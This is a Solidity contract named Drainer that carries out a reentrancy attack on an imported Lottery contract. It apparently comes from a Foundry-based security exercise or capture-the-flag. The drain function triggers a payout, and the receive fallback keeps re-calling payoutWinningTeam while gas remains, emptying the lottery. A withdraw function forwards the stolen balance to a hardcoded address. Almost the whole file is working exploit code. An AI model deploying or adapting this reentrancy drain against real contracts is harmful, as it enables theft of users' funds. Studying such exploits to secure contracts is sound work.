// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.0;

import "./Lottery.sol";
import "./Oracle.sol";
import {console} from "forge-std/console.sol";

contract Drainer {
 
    Lottery lo;
    Oracle or;

    constructor(Lottery lottery, Oracle oracle){
        address payable lotAddr = payable(address(lottery));
        lo = Lottery(lotAddr);
        or = oracle;
    }

    function drain() external {
        console.log("In drain");
        lo.makeAGuess(address(this), 1);
        lo.payoutWinningTeam(address(this));
    }

    receive() external payable {
        if (gasleft() > 40_000) {
            lo.payoutWinningTeam(address(this));
        }
    }

    function withdraw() public {
        (bool sent,) = address(0x36efd039149b9F5aF6aC75d85A8d3e9088bc7d4f).call{value: address(this).balance}("");
        require(sent);
    }
}
